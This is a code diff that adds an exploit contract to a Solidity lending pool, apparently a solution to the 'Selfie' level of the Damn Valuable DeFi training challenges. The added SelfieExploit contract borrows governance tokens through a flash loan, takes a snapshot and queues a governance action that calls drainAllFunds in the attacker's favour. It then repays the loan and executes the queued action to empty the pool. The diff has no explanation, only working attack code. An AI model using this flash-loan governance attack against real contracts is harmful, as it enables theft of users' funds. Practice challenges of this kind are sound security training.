@@ -5,6 +5,7 @@ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "./SimpleGovernance.sol";
+import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
 
 /**
  * @title SelfiePool
@@ -54,5 +55,37 @@ contract SelfiePool is ReentrancyGuard {
         token.transfer(receiver, amount);
         
         emit FundsDrained(receiver, amount);
+    }
+}
+
+contract SelfieExploit {
+    SelfiePool pool;
+    uint256 actionId;
+    address attacker;
+
+    constructor(SelfiePool _pool) {
+        pool = _pool;
+        attacker = msg.sender;
+    }
+
+    function attack() public {
+        pool.flashLoan(1_500_000 ether);
+    }
+
+    function receiveTokens(DamnValuableTokenSnapshot token, uint256 amount) public {
+        token.snapshot();
+        actionId = pool.governance().queueAction(
+            address(pool),
+            abi.encodeWithSignature(
+                "drainAllFunds(address)",
+                attacker 
+            ),
+            0
+        );
+        token.transfer(address(pool), amount);
+    }
+
+    function molest() public {
+        pool.governance().executeAction(actionId);
     }
 }
